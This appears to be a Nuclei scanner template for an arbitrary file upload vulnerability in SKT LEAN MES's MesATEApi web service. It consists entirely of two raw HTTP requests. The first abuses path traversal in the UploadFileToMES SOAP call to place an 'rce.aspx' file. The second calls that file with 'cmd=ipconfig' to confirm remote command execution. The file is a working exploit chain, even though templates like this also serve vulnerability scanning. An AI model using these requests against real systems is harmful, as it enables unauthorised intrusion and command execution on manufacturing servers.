id: SKT-LEAN-MES-MesATEApi-upload
info:
  name: SKT-LEAN-MES-MesATEApi-upload
  author: lemonlove7
  severity: critical
flow: http(1) && http(2)
http:
  - raw:
      - |-
        POST /WebService/MesATEApi.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 1270
        SOAPAction: "http://mesateapi.com/UploadFileToMES"
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadFileToMES xmlns="http://mesateapi.com/">
              <empNo>string</empNo>
              <sn>string</sn>
              <resource>string</resource>
              <station>string</station>
              <fileBytes></fileBytes>
              <folderName>/../ertyui</folderName>
              <fileName>rce.aspx</fileName>
            </UploadFileToMES>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: word
        part: body
        words:
          - UploadFileToMESResult
          - UploadFileToMESResponse
        internal: true
    matchers-condition: and
  - raw:
      - |-
        GET /ertyui/rce.aspx?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Windows IP
    matchers-condition: and
